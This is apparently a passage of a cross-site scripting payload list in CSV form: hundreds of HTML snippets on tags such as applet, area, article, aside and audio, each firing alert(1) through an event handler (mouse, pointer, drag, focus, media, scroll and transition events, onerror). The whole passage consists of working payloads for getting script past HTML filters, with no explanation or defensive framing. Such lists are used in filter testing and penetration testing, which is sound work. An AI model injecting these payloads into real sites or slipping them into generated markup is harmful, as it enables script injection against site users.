,,"<animatetransform draggable=""true"" ondragend=""alert(1)"" style=display:block>test</animatetransform>",,
,,"<animatetransform draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</animatetransform>",,
,,"<animatetransform draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</animatetransform>",,
,,"<animatetransform draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</animatetransform>",,
,,"<animatetransform draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</animatetransform>",,
,,"<animatetransform id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></animatetransform>",,
,,<animatetransform onafterscriptexecute=alert(1)><script>1</script>,,
,,<animatetransform onbeforescriptexecute=alert(1)><script>1</script>,,
,,<animatetransform onblur=alert(1) id=x tabindex=1 style=display:block>test</animatetransform><input value=clickme>,,
,,"<animatetransform onclick=""alert(1)"" style=display:block>test</animatetransform>",,
,,"<animatetransform oncontextmenu=""alert(1)"" style=display:block>test</animatetransform>",,
,,"<animatetransform oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<animatetransform oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<animatetransform ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</animatetransform>",,
,,<animatetransform onfocus=alert(1) autofocus tabindex=1>,,
,,<animatetransform onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</animatetransform><input value=clickme>,,
,,"<animatetransform onkeydown=""alert(1)"" contenteditable style=display:block>test</animatetransform>",,
,,"<animatetransform onkeypress=""alert(1)"" contenteditable style=display:block>test</animatetransform>",,
,,"<animatetransform onkeyup=""alert(1)"" contenteditable style=display:block>test</animatetransform>",,
,,"<animatetransform onmousedown=""alert(1)"" style=display:block>test</animatetransform>",,
,,"<animatetransform onmouseenter=""alert(1)"" style=display:block>test</animatetransform>",,
,,"<animatetransform onmouseleave=""alert(1)"" style=display:block>test</animatetransform>",,
,,"<animatetransform onmousemove=""alert(1)"" style=display:block>test</animatetransform>",,
,,"<animatetransform onmouseout=""alert(1)"" style=display:block>test</animatetransform>",,
,,"<animatetransform onmouseover=""alert(1)"" style=display:block>test</animatetransform>",,
,,"<animatetransform onmouseup=""alert(1)"" style=display:block>test</animatetransform>",,
,,<animatetransform onmousewheel=alert(1) style=display:block>requires scrolling,,
,,<animatetransform onpointercancel=alert(1)>XSS</animatetransform>,,
,,<animatetransform onpointerdown=alert(1) style=display:block>XSS</animatetransform>,,
,,<animatetransform onpointerenter=alert(1) style=display:block>XSS</animatetransform>,,
,,<animatetransform onpointerleave=alert(1) style=display:block>XSS</animatetransform>,,
,,<animatetransform onpointermove=alert(1) style=display:block>XSS</animatetransform>,,
,,<animatetransform onpointerout=alert(1) style=display:block>XSS</animatetransform>,,
,,<animatetransform onpointerover=alert(1) style=display:block>XSS</animatetransform>,,
,,<animatetransform onpointerrawupdate=alert(1) style=display:block>XSS</animatetransform>,,
,,<animatetransform onpointerup=alert(1) style=display:block>XSS</animatetransform>,,
,,"<animatetransform onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></animatetransform>",,
,,<animatetransform onwebkitmouseforcechanged=alert(1)>XSS</animatetransform>,,
,,<animatetransform onwebkitmouseforcedown=alert(1)>XSS</animatetransform>,,
,,<animatetransform onwebkitmouseforceup=alert(1)>XSS</animatetransform>,,
,,<animatetransform onwebkitmouseforcewillbegin=alert(1)>XSS</animatetransform>,,
,,<animatetransform onwebkitwillrevealbottom=alert(1)>XSS</animatetransform>,,
,,<applet contenteditable onbeforeinput=alert(1)>test,,
,,"<applet draggable=""true"" ondrag=""alert(1)"" style=display:block>test</applet>",,
,,"<applet draggable=""true"" ondragend=""alert(1)"" style=display:block>test</applet>",,
,,"<applet draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</applet>",,
,,"<applet draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</applet>",,
,,"<applet draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</applet>",,
,,"<applet draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</applet>",,
,,"<applet id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></applet>",,
,,<applet id=x tabindex=1 onfocus=alert(1)></applet>,,
,,<applet id=x tabindex=1 onfocusin=alert(1)></applet>,,
,,<applet onafterscriptexecute=alert(1)><script>1</script>,,
,,"<applet onbeforecopy=""alert(1)"" contenteditable>test</applet>",,
,,"<applet onbeforecut=""alert(1)"" contenteditable>test</applet>",,
,,<applet onbeforescriptexecute=alert(1)><script>1</script>,,
,,<applet onblur=alert(1) id=x tabindex=1 style=display:block>test</applet><input value=clickme>,,
,,"<applet onclick=""alert(1)"" style=display:block>test</applet>",,
,,"<applet oncontextmenu=""alert(1)"" style=display:block>test</applet>",,
,,"<applet oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<applet oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<applet ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</applet>",,
,,<applet onfocus=alert(1) autofocus tabindex=1>,,
,,<applet onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</applet><input value=clickme>,,
,,"<applet onkeydown=""alert(1)"" contenteditable style=display:block>test</applet>",,
,,"<applet onkeypress=""alert(1)"" contenteditable style=display:block>test</applet>",,
,,"<applet onkeyup=""alert(1)"" contenteditable style=display:block>test</applet>",,
,,"<applet onmousedown=""alert(1)"" style=display:block>test</applet>",,
,,"<applet onmouseenter=""alert(1)"" style=display:block>test</applet>",,
,,"<applet onmouseleave=""alert(1)"" style=display:block>test</applet>",,
,,"<applet onmousemove=""alert(1)"" style=display:block>test</applet>",,
,,"<applet onmouseout=""alert(1)"" style=display:block>test</applet>",,
,,"<applet onmouseover=""alert(1)"" style=display:block>test</applet>",,
,,"<applet onmouseup=""alert(1)"" style=display:block>test</applet>",,
,,<applet onmousewheel=alert(1) style=display:block>requires scrolling,,
,,"<applet onpaste=""alert(1)"" contenteditable>test</applet>",,
,,<applet onpointercancel=alert(1)>XSS</applet>,,
,,<applet onpointerdown=alert(1) style=display:block>XSS</applet>,,
,,<applet onpointerenter=alert(1) style=display:block>XSS</applet>,,
,,<applet onpointerleave=alert(1) style=display:block>XSS</applet>,,
,,<applet onpointermove=alert(1) style=display:block>XSS</applet>,,
,,<applet onpointerout=alert(1) style=display:block>XSS</applet>,,
,,<applet onpointerover=alert(1) style=display:block>XSS</applet>,,
,,<applet onpointerrawupdate=alert(1) style=display:block>XSS</applet>,,
,,<applet onpointerup=alert(1) style=display:block>XSS</applet>,,
,,"<applet onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></applet>",,
,,<applet onwebkitmouseforcechanged=alert(1)>XSS</applet>,,
,,<applet onwebkitmouseforcedown=alert(1)>XSS</applet>,,
,,<applet onwebkitmouseforceup=alert(1)>XSS</applet>,,
,,<applet onwebkitmouseforcewillbegin=alert(1)>XSS</applet>,,
,,<applet onwebkitwillrevealbottom=alert(1)>XSS</applet>,,
,,<area contenteditable onbeforeinput=alert(1)>test,,
,,"<area draggable=""true"" ondrag=""alert(1)"" style=display:block>test</area>",,
,,"<area draggable=""true"" ondragend=""alert(1)"" style=display:block>test</area>",,
,,"<area draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</area>",,
,,"<area draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</area>",,
,,"<area draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</area>",,
,,"<area draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</area>",,
,,"<area id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></area>",,
,,<area onafterscriptexecute=alert(1)><script>1</script>,,
,,"<area onbeforecopy=""alert(1)"" contenteditable>test</area>",,
,,"<area onbeforecut=""alert(1)"" contenteditable>test</area>",,
,,<area onbeforescriptexecute=alert(1)><script>1</script>,,
,,<area onblur=alert(1) id=x tabindex=1 style=display:block>test</area><input value=clickme>,,
,,"<area onclick=""alert(1)"" style=display:block>test</area>",,
,,"<area oncontextmenu=""alert(1)"" style=display:block>test</area>",,
,,"<area oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<area oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<area ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</area>",,
,,<area onfocus=alert(1) autofocus tabindex=1>,,
,,<area onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</area><input value=clickme>,,
,,"<area onkeydown=""alert(1)"" contenteditable style=display:block>test</area>",,
,,"<area onkeypress=""alert(1)"" contenteditable style=display:block>test</area>",,
,,"<area onkeyup=""alert(1)"" contenteditable style=display:block>test</area>",,
,,"<area onmousedown=""alert(1)"" style=display:block>test</area>",,
,,"<area onmouseenter=""alert(1)"" style=display:block>test</area>",,
,,"<area onmouseleave=""alert(1)"" style=display:block>test</area>",,
,,"<area onmousemove=""alert(1)"" style=display:block>test</area>",,
,,"<area onmouseout=""alert(1)"" style=display:block>test</area>",,
,,"<area onmouseover=""alert(1)"" style=display:block>test</area>",,
,,"<area onmouseup=""alert(1)"" style=display:block>test</area>",,
,,<area onmousewheel=alert(1) style=display:block>requires scrolling,,
,,"<area onpaste=""alert(1)"" contenteditable>test</area>",,
,,<area onpointercancel=alert(1)>XSS</area>,,
,,<area onpointerdown=alert(1) style=display:block>XSS</area>,,
,,<area onpointerenter=alert(1) style=display:block>XSS</area>,,
,,<area onpointerleave=alert(1) style=display:block>XSS</area>,,
,,<area onpointermove=alert(1) style=display:block>XSS</area>,,
,,<area onpointerout=alert(1) style=display:block>XSS</area>,,
,,<area onpointerover=alert(1) style=display:block>XSS</area>,,
,,<area onpointerrawupdate=alert(1) style=display:block>XSS</area>,,
,,<area onpointerup=alert(1) style=display:block>XSS</area>,,
,,"<area onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></area>",,
,,<area onwebkitmouseforcechanged=alert(1)>XSS</area>,,
,,<area onwebkitmouseforcedown=alert(1)>XSS</area>,,
,,<area onwebkitmouseforceup=alert(1)>XSS</area>,,
,,<area onwebkitmouseforcewillbegin=alert(1)>XSS</area>,,
,,<area onwebkitwillrevealbottom=alert(1)>XSS</area>,,
,,<article contenteditable onbeforeinput=alert(1)>test,,
,,"<article draggable=""true"" ondrag=""alert(1)"" style=display:block>test</article>",,
,,"<article draggable=""true"" ondragend=""alert(1)"" style=display:block>test</article>",,
,,"<article draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</article>",,
,,"<article draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</article>",,
,,"<article draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</article>",,
,,"<article draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</article>",,
,,"<article id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></article>",,
,,<article id=x tabindex=1 onfocus=alert(1)></article>,,
,,<article id=x tabindex=1 onfocusin=alert(1)></article>,,
,,<article onafterscriptexecute=alert(1)><script>1</script>,,
,,"<article onbeforecopy=""alert(1)"" contenteditable>test</article>",,
,,"<article onbeforecut=""alert(1)"" contenteditable>test</article>",,
,,<article onbeforescriptexecute=alert(1)><script>1</script>,,
,,<article onblur=alert(1) id=x tabindex=1 style=display:block>test</article><input value=clickme>,,
,,"<article onclick=""alert(1)"" style=display:block>test</article>",,
,,"<article oncontextmenu=""alert(1)"" style=display:block>test</article>",,
,,"<article oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<article oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<article ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</article>",,
,,<article onfocus=alert(1) autofocus tabindex=1>,,
,,<article onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</article><input value=clickme>,,
,,"<article onkeydown=""alert(1)"" contenteditable style=display:block>test</article>",,
,,"<article onkeypress=""alert(1)"" contenteditable style=display:block>test</article>",,
,,"<article onkeyup=""alert(1)"" contenteditable style=display:block>test</article>",,
,,"<article onmousedown=""alert(1)"" style=display:block>test</article>",,
,,"<article onmouseenter=""alert(1)"" style=display:block>test</article>",,
,,"<article onmouseleave=""alert(1)"" style=display:block>test</article>",,
,,"<article onmousemove=""alert(1)"" style=display:block>test</article>",,
,,"<article onmouseout=""alert(1)"" style=display:block>test</article>",,
,,"<article onmouseover=""alert(1)"" style=display:block>test</article>",,
,,"<article onmouseup=""alert(1)"" style=display:block>test</article>",,
,,<article onmousewheel=alert(1) style=display:block>requires scrolling,,
,,"<article onpaste=""alert(1)"" contenteditable>test</article>",,
,,<article onpointercancel=alert(1)>XSS</article>,,
,,<article onpointerdown=alert(1) style=display:block>XSS</article>,,
,,<article onpointerenter=alert(1) style=display:block>XSS</article>,,
,,<article onpointerleave=alert(1) style=display:block>XSS</article>,,
,,<article onpointermove=alert(1) style=display:block>XSS</article>,,
,,<article onpointerout=alert(1) style=display:block>XSS</article>,,
,,<article onpointerover=alert(1) style=display:block>XSS</article>,,
,,<article onpointerrawupdate=alert(1) style=display:block>XSS</article>,,
,,<article onpointerup=alert(1) style=display:block>XSS</article>,,
,,"<article onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></article>",,
,,<article onwebkitmouseforcechanged=alert(1)>XSS</article>,,
,,<article onwebkitmouseforcedown=alert(1)>XSS</article>,,
,,<article onwebkitmouseforceup=alert(1)>XSS</article>,,
,,<article onwebkitmouseforcewillbegin=alert(1)>XSS</article>,,
,,<article onwebkitwillrevealbottom=alert(1)>XSS</article>,,
,,<aside contenteditable onbeforeinput=alert(1)>test,,
,,"<aside draggable=""true"" ondrag=""alert(1)"" style=display:block>test</aside>",,
,,"<aside draggable=""true"" ondragend=""alert(1)"" style=display:block>test</aside>",,
,,"<aside draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</aside>",,
,,"<aside draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</aside>",,
,,"<aside draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</aside>",,
,,"<aside draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</aside>",,
,,"<aside id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></aside>",,
,,<aside id=x tabindex=1 onfocus=alert(1)></aside>,,
,,<aside id=x tabindex=1 onfocusin=alert(1)></aside>,,
,,<aside onafterscriptexecute=alert(1)><script>1</script>,,
,,"<aside onbeforecopy=""alert(1)"" contenteditable>test</aside>",,
,,"<aside onbeforecut=""alert(1)"" contenteditable>test</aside>",,
,,<aside onbeforescriptexecute=alert(1)><script>1</script>,,
,,<aside onblur=alert(1) id=x tabindex=1 style=display:block>test</aside><input value=clickme>,,
,,"<aside onclick=""alert(1)"" style=display:block>test</aside>",,
,,"<aside oncontextmenu=""alert(1)"" style=display:block>test</aside>",,
,,"<aside oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<aside oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<aside ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</aside>",,
,,<aside onfocus=alert(1) autofocus tabindex=1>,,
,,<aside onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</aside><input value=clickme>,,
,,"<aside onkeydown=""alert(1)"" contenteditable style=display:block>test</aside>",,
,,"<aside onkeypress=""alert(1)"" contenteditable style=display:block>test</aside>",,
,,"<aside onkeyup=""alert(1)"" contenteditable style=display:block>test</aside>",,
,,"<aside onmousedown=""alert(1)"" style=display:block>test</aside>",,
,,"<aside onmouseenter=""alert(1)"" style=display:block>test</aside>",,
,,"<aside onmouseleave=""alert(1)"" style=display:block>test</aside>",,
,,"<aside onmousemove=""alert(1)"" style=display:block>test</aside>",,
,,"<aside onmouseout=""alert(1)"" style=display:block>test</aside>",,
,,"<aside onmouseover=""alert(1)"" style=display:block>test</aside>",,
,,"<aside onmouseup=""alert(1)"" style=display:block>test</aside>",,
,,<aside onmousewheel=alert(1) style=display:block>requires scrolling,,
,,"<aside onpaste=""alert(1)"" contenteditable>test</aside>",,
,,<aside onpointercancel=alert(1)>XSS</aside>,,
,,<aside onpointerdown=alert(1) style=display:block>XSS</aside>,,
,,<aside onpointerenter=alert(1) style=display:block>XSS</aside>,,
,,<aside onpointerleave=alert(1) style=display:block>XSS</aside>,,
,,<aside onpointermove=alert(1) style=display:block>XSS</aside>,,
,,<aside onpointerout=alert(1) style=display:block>XSS</aside>,,
,,<aside onpointerover=alert(1) style=display:block>XSS</aside>,,
,,<aside onpointerrawupdate=alert(1) style=display:block>XSS</aside>,,
,,<aside onpointerup=alert(1) style=display:block>XSS</aside>,,
,,"<aside onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></aside>",,
,,<aside onwebkitmouseforcechanged=alert(1)>XSS</aside>,,
,,<aside onwebkitmouseforcedown=alert(1)>XSS</aside>,,
,,<aside onwebkitmouseforceup=alert(1)>XSS</aside>,,
,,<aside onwebkitmouseforcewillbegin=alert(1)>XSS</aside>,,
,,<aside onwebkitwillrevealbottom=alert(1)>XSS</aside>,,
,,"<audio autoplay controls onpause=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",,
,,"<audio autoplay controls onseeked=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",,
,,"<audio autoplay controls onseeking=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",,
,,"<audio autoplay controls onvolumechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",,
,,"<audio autoplay onloadedmetadata=alert(1)> <source src=""validaudio.wav"" type=""audio/wav""></audio>",,
,,"<audio autoplay onplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",,
,,"<audio autoplay onplaying=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",,
,,<audio contenteditable onbeforeinput=alert(1)>test,,
,,"<audio controls autoplay onended=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",,
,,"<audio controls autoplay onratechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",,
,,"<audio controls autoplay ontimeupdate=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",,
,,<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>,,
,,<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>,,
,,<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>,,
,,<audio controls src=1 onfocus=alert(1) autofocus>,,
,,<audio controls src=1 onfocusin=alert(1) autofocus>,,
,,"<audio draggable=""true"" ondrag=""alert(1)"" style=display:block>test</audio>",,
,,"<audio draggable=""true"" ondragend=""alert(1)"" style=display:block>test</audio>",,
,,"<audio draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</audio>",,
,,"<audio draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</audio>",,
,,"<audio draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</audio>",,
,,"<audio draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</audio>",,
,,"<audio id=x controls onfocus=alert(1) id=x><source src=""validaudio.wav""></audio>",,
,,"<audio id=x controls onfocusin=alert(1) id=x><source src=""validaudio.wav""></audio>",,
,,"<audio id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></audio>",,
,,<audio onafterscriptexecute=alert(1)><script>1</script>,,
,,"<audio onbeforecopy=""alert(1)"" contenteditable>test</audio>",,
,,"<audio onbeforecut=""alert(1)"" contenteditable>test</audio>",,
,,<audio onbeforescriptexecute=alert(1)><script>1</script>,,
,,<audio onblur=alert(1) id=x tabindex=1 style=display:block>test</audio><input value=clickme>,,
,,"<audio oncanplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",,
,,"<audio onclick=""alert(1)"" style=display:block>test</audio>",,
,,"<audio oncontextmenu=""alert(1)"" style=display:block>test</audio>",,
,,"<audio oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<audio oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<audio ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</audio>",,
,,<audio onfocus=alert(1) autofocus tabindex=1>,,
,,<audio onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</audio><input value=clickme>,,
,,"<audio onkeydown=""alert(1)"" contenteditable style=display:block>test</audio>",,
,,"<audio onkeypress=""alert(1)"" contenteditable style=display:block>test</audio>",,
,,"<audio onkeyup=""alert(1)"" contenteditable style=display:block>test</audio>",,
,,"<audio onloadeddata=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",,
,,"<audio onmousedown=""alert(1)"" style=display:block>test</audio>",,
,,"<audio onmouseenter=""alert(1)"" style=display:block>test</audio>",,
,,"<audio onmouseleave=""alert(1)"" style=display:block>test</audio>",,
,,"<audio onmousemove=""alert(1)"" style=display:block>test</audio>",,
,,"<audio onmouseout=""alert(1)"" style=display:block>test</audio>",,
,,"<audio onmouseover=""alert(1)"" style=display:block>test</audio>",,
,,"<audio onmouseup=""alert(1)"" style=display:block>test</audio>",,
,,<audio onmousewheel=alert(1) style=display:block>requires scrolling,,
,,"<audio onpaste=""alert(1)"" contenteditable>test</audio>",,
,,<audio onpointercancel=alert(1)>XSS</audio>,,
,,<audio onpointerdown=alert(1) style=display:block>XSS</audio>,,
,,<audio onpointerenter=alert(1) style=display:block>XSS</audio>,,
,,<audio onpointerleave=alert(1) style=display:block>XSS</audio>,,
,,<audio onpointermove=alert(1) style=display:block>XSS</audio>,,
,,<audio onpointerout=alert(1) style=display:block>XSS</audio>,,
,,<audio onpointerover=alert(1) style=display:block>XSS</audio>,,
,,<audio onpointerrawupdate=alert(1) style=display:block>XSS</audio>,,
,,<audio onpointerup=alert(1) style=display:block>XSS</audio>,,
,,"<audio onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></audio>",,
,,<audio onwebkitmouseforcechanged=alert(1)>XSS</audio>,,
,,<audio onwebkitmouseforcedown=alert(1)>XSS</audio>,,
,,<audio onwebkitmouseforceup=alert(1)>XSS</audio>,,
,,<audio onwebkitmouseforcewillbegin=alert(1)>XSS</audio>,,
,,<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>,,
,,<audio onwebkitwillrevealbottom=alert(1)>XSS</audio>,,
,,<audio src/onerror=alert(1)>,,
,,<audio2 contenteditable onbeforeinput=alert(1)>test,,
,,"<audio2 draggable=""true"" ondrag=""alert(1)"" style=display:block>test</audio2>",,
,,"<audio2 draggable=""true"" ondragend=""alert(1)"" style=display:block>test</audio2>",,
,,"<audio2 draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</audio2>",,
,,"<audio2 draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</audio2>",,
,,"<audio2 draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</audio2>",,
,,"<audio2 draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</audio2>",,
,,"<audio2 id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></audio2>",,
,,<audio2 onafterscriptexecute=alert(1)><script>1</script>,,
,,<audio2 onbeforescriptexecute=alert(1)><script>1</script>,,
,,<audio2 onblur=alert(1) id=x tabindex=1 style=display:block>test</audio2><input value=clickme>,,
,,"<audio2 onclick=""alert(1)"" style=display:block>test</audio2>",,
,,"<audio2 oncontextmenu=""alert(1)"" style=display:block>test</audio2>",,
,,"<audio2 oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<audio2 oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<audio2 ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</audio2>",,
,,<audio2 onfocus=alert(1) autofocus tabindex=1>,,
,,<audio2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</audio2><input value=clickme>,,
,,"<audio2 onkeydown=""alert(1)"" contenteditable style=display:block>test</audio2>",,
,,"<audio2 onkeypress=""alert(1)"" contenteditable style=display:block>test</audio2>",,
,,"<audio2 onkeyup=""alert(1)"" contenteditable style=display:block>test</audio2>",,
,,"<audio2 onmousedown=""alert(1)"" style=display:block>test</audio2>",,
,,"<audio2 onmouseenter=""alert(1)"" style=display:block>test</audio2>",,
,,"<audio2 onmouseleave=""alert(1)"" style=display:block>test</audio2>",,
,,"<audio2 onmousemove=""alert(1)"" style=display:block>test</audio2>",,
,,"<audio2 onmouseout=""alert(1)"" style=display:block>test</audio2>",,
,,"<audio2 onmouseover=""alert(1)"" style=display:block>test</audio2>",,
,,"<audio2 onmouseup=""alert(1)"" style=display:block>test</audio2>",,
,,<audio2 onmousewheel=alert(1) style=display:block>requires scrolling,,
,,<audio2 onpointercancel=alert(1)>XSS</audio2>,,
,,<audio2 onpointerdown=alert(1) style=display:block>XSS</audio2>,,
,,<audio2 onpointerenter=alert(1) style=display:block>XSS</audio2>,,
,,<audio2 onpointerleave=alert(1) style=display:block>XSS</audio2>,,
,,<audio2 onpointermove=alert(1) style=display:block>XSS</audio2>,,
,,<audio2 onpointerout=alert(1) style=display:block>XSS</audio2>,,
,,<audio2 onpointerover=alert(1) style=display:block>XSS</audio2>,,
,,<audio2 onpointerrawupdate=alert(1) style=display:block>XSS</audio2>,,
,,<audio2 onpointerup=alert(1) style=display:block>XSS</audio2>,,
,,"<audio2 onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></audio2>",,
,,<audio2 onwebkitmouseforcechanged=alert(1)>XSS</audio2>,,
,,<audio2 onwebkitmouseforcedown=alert(1)>XSS</audio2>,,
,,<audio2 onwebkitmouseforceup=alert(1)>XSS</audio2>,,
,,<audio2 onwebkitmouseforcewillbegin=alert(1)>XSS</audio2>,,
,,<audio2 onwebkitwillrevealbottom=alert(1)>XSS</audio2>,,
,,<b contenteditable onbeforeinput=alert(1)>test,,
,,"<b draggable=""true"" ondrag=""alert(1)"" style=display:block>test</b>",,
,,"<b draggable=""true"" ondragend=""alert(1)"" style=display:block>test</b>",,
,,"<b draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</b>",,
,,"<b draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</b>",,
,,"<b draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</b>",,
,,"<b draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</b>",,
,,"<b id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></b>",,
